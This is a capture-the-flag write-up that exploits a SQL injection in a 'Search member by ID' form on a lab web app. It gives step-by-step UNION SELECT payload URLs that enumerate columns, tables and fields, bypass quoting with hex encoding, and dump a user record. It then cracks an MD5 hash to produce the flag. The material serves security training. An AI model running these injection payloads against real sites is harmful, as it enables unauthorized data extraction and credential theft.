In the http://192.168.1.32/?page=member page, there is a HTML form described as follow:
<form action="#" method="GET">
  <input type="hidden" name="page" value="member"/>
  <input type="text" name="id" style="width:100%;">
  <br />
  <input type="submit" value="Submit" name="Submit">
</form>

The title of the page is: "Search member by ID".
Try with different IDs and found out that with id=5, there is a user that is call GetThe Flag.
There are good reasons to think the flag is located somewhere in the member table at the id 5.

Step 1: Test Number of Columns: Start by testing if the UNION SELECT works with just numbers.
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201%20--%20&Submit=Submit#
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,2%20--%20&Submit=Submit#
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,2,3%20--%20&Submit=Submit#
It will indicate the number of columns that the query expects.

Step 2: Try Simple SQL Injection to Extract the Database Name:
Assuming that the number of columns is 2 (based on the previous trial), attempt to get the database name with the following:
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,database()%20--%20&Submit=Submit#
This should return the current database name in the second column.

Step 3: Try Table Name Extraction:
If the database name is successfully extracted, now we can proceed to extract the table names:
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20&Submit=Submit#
This should return the names of the tables in the current database if the SQL query is correct.

Step 4: Extract Columns from a Table:
Try to extract the columns from table users:
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=users%20--%20&Submit=Submit#
Unknown column 'users' in 'where clause'

It seems this step doesn't work because there might be a filtering mechanisms to prevent SQL injection.

The following payload use a HEX representation for the string users to avoid special character issues: users => 0x7573657273
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=0x7573657273%20--%20&Submit=Submit#
I can found that there is 8 columns in the "users" table: user_id, first_name, last_name, town, country, planet, Commentaire, countersign

Construct the payload to retrieve all column data for the user with user_id=5:
http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,CONCAT_WS(CHAR(32,58,32),user_id,first_name,last_name,town,country,planet,Commentaire,countersign)%20FROM%20users%20WHERE%20user_id=5%20--%20&Submit=Submit#

Found out that the column "Commentaire" contain an instruction: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
And the column "sountersign" contain an encrypted string "5ff9d0165b4f92b14994e5c685cdce28"

Decrypt the original password using https://hashes.com/en/decrypt/hash
5ff9d0165b4f92b14994e5c685cdce28:FortyTwo:MD5

SHA256 on the lower case string "fortytwo" using https://emn178.github.io/online-tools/sha256.html
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

A way to fix this vulnerability would be to sanitize the input to avoid special characters in the request.